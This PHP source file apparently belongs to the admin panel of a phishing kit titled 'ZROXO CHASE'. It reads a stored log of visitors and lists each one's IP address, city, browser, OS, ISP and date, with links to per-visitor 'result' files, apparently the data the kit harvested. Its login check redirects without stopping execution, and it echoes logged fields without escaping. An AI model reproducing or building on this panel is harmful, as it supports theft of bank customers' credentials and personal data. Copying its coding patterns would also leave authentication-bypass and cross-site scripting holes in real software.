<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['login'])) {
    header("location: login.php");
}

echo '<!DOCTYPE html>';
echo '<html>';
echo '<meta http-equiv="content-type" content="text/html;charset=utf-8" />';
echo '<head>';
echo '<meta charset="utf-8">';
echo '<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">';
echo '<title>ZROXO CHASE | VISITOR</title>';
echo '<link rel="icon" href="files/logo.png" type="image/png">';
echo '<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700">';
echo '<link rel="stylesheet" href="files/assets/vendor/nucleo/css/nucleo.css" type="text/css">';
echo '<link rel="stylesheet" href="files/assets/vendor/%40fortawesome/fontawesome-free/css/all.min.css" type="text/css">';
echo '<link rel="stylesheet" href="files/assets/css/argon.min5438.css?v=1.2.0" type="text/css">';
echo '</head>';
echo '';
echo '<body>';
echo '<style type="text/css">';
echo '.bg-gradient-az{';
echo 'background: linear-gradient(87deg,#633b56 0,#f56036 100%)!important;';
echo '}.bg-gradient-ze {';
echo 'background: linear-gradient(87deg,#755f63 0,#e0d447 100%)!important;';
echo '}.bg-gradient-er {';
echo 'background: linear-gradient(87deg,#2dce89 0,#612e22 100%)!important;';
echo '}';
echo "h4 {
    white-space: break-spaces;
}";
echo '</style>';
echo '<nav class="sidenav navbar navbar-vertical  fixed-left  navbar-expand-xs navbar-light bg-white" id="sidenav-main">';
echo '<div class="scrollbar-inner">';
echo '<!-- Brand -->';
echo '<div class="sidenav-header  d-flex  align-items-center">';
echo '<a class="navbar-brand" href="">';
echo '<img src="files/logo.png" class="navbar-brand-img" alt="...">';
echo '</a>';
echo '<div class=" ml-auto ">';
echo '<!-- Sidenav toggler -->';
echo '<div class="sidenav-toggler d-none d-xl-block" data-action="sidenav-unpin" data-target="#sidenav-main">';
echo '<div class="sidenav-toggler-inner">';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '<div class="navbar-inner">';
echo '<!-- Collapse -->';
echo '<div class="collapse navbar-collapse" id="sidenav-collapse-main">';
echo '<!-- Nav items -->';
echo '<ul class="navbar-nav">';
echo '<li class="nav-item">';
echo '<a class="nav-link active" href="index.php" >';
echo '<i class="ni ni-shop text-primary"></i>';
echo '<span class="nav-link-text">Statistic</span>';
echo '</a>';
echo '</li>';
echo '';
echo '<li class="nav-item">';
echo '<a class="nav-link" href="visitor.php" >';
echo '<i class="ni ni-ui-04 text-info"></i>';
echo '<span class="nav-link-text">List Result</span>';
echo '</a>';
echo '</li>';
echo '<li class="nav-item">';
echo '<a class="nav-link" href="settings.php" >';
echo '<i class="ni ni-settings text-pink"></i>';
echo '<span class="nav-link-text">Settings</span>';
echo '</a>';
echo '</li>';
echo '';
echo '';
echo '</ul>';
echo '<!-- Divider -->';
echo '<hr class="my-3">';
echo '<!-- Heading -->';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</nav>';
echo '<!-- Main content -->';
echo '<div class="main-content" id="panel">';
echo '<!-- Topnav -->';
echo '<nav class="navbar navbar-top navbar-expand navbar-light bg-secondary border-bottom">';
echo '<div class="container-fluid">';
echo '<div class="collapse navbar-collapse" id="navbarSupportedContent">';
echo '';
echo '<!-- Navbar links -->';
echo '<ul class="navbar-nav align-items-center  ml-md-auto ">';
echo '<li class="nav-item d-xl-none">';
echo '<!-- Sidenav toggler -->';
echo '<div class="pr-3 sidenav-toggler sidenav-toggler-light" data-action="sidenav-pin" data-target="#sidenav-main">';
echo '<div class="sidenav-toggler-inner">';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '<i class="sidenav-toggler-line"></i>';
echo '</div>';
echo '</div>';
echo '</li>';
echo '</ul>';
echo '</div>';
echo '</div>';
echo '</nav>';
echo '<!-- Header -->';
echo '<div class="header pb-6">';
echo '<div class="container-fluid">';
echo '<div class="header-body">';
echo '<div class="row align-items-center py-4">';
echo '<div class="col-lg-6 col-7">';
echo '<nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">';
echo '<ol class="breadcrumb breadcrumb-links">';
echo '<li class="breadcrumb-item"><a href="index.php"><i class="fas fa-home"></i></a></li>';
echo '</ol>';
echo '</nav>';
echo '</div>';
echo '';
echo '</div>';
echo '</div>';
echo '</div>';
echo '</div>';
echo '<!-- Page content -->';
echo '<!-- Page content -->';
echo '<div class="container-fluid mt--6">';
echo '<!-- Table -->';
echo '<div class="row">';
echo '<div class="col">';
echo '<div class="card">';
echo '<!-- Card header -->';
echo '<div class="card-header">';
echo '<h3 class="mb-0">RESULT</h3>';
echo '</div>';
echo '<div class="table-responsive py-4">';
echo '<table class="table table-flush" id="datatable-basic">';
echo '<thead class="thead-light">';
echo '<tr>';
echo '<th>IP ADDRESS</th>';
echo '<th>City</th>';
echo '<th>BROWSER</th>';
echo '<th>OS</th>';
echo '<th>ISP</th>';
echo '<th>DATE</th>';
echo '<th>Data</th>';
echo '</tr>';
echo '</thead>';
echo '';
echo '<tbody>';
echo '';
 if(file_exists("result/visitor.txt")){
                                            $bin = file_get_contents("result/visitor.txt");
                                            $bin = explode("\n", $bin);
                                            $counny = count($bin);
                                            foreach($bin as $bins) {
                                                $bins = explode("|", $bins);
                                                $ip = $bins[0];
                                                $city = $bins[2];
                                                $browser = $bins[3];
                                                $platform = $bins[4];
                                                $isp = $bins[5];
                                                $date = $bins[6];
                                                $rslt = $bins[7];

                                                if($ip == "") {

                                                }else{
                                                echo "<tr>
                                                <td>".$ip."</td>
                                                <td>".$city."</td>
                                                <td>".$browser."</td>
                                                <td>".$platform."</td>
                                                <td>".$isp."</td>
                                                <td>".$date."</td>
                                                <td><button class='btn'><a href='result/".$rslt.".txt' target='_blank'>Open Result</a></button></td>
                                                </tr>";
                                                }


                                                }
                                            }else{
                                                echo "<tr><td>Not found</td><td></td><td></td><td></td><td></td></tr>";
                                            }echo '';
echo '</tbody>';
echo '</table>';

echo '</div>';
echo '</div>';
echo '<!-- JS -->';
echo '<script src="files/assets/vendor/jquery/dist/jquery.min.js"></script>';
echo '<script src="files/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>';
echo '<script src="files/assets/vendor/js-cookie/js.cookie.js"></script>';
echo '<script src="files/assets/js/argon.min5438.js?v=1.2.0"></script>';
echo '';
echo '';
echo '</body>';
echo '</html>';
?>
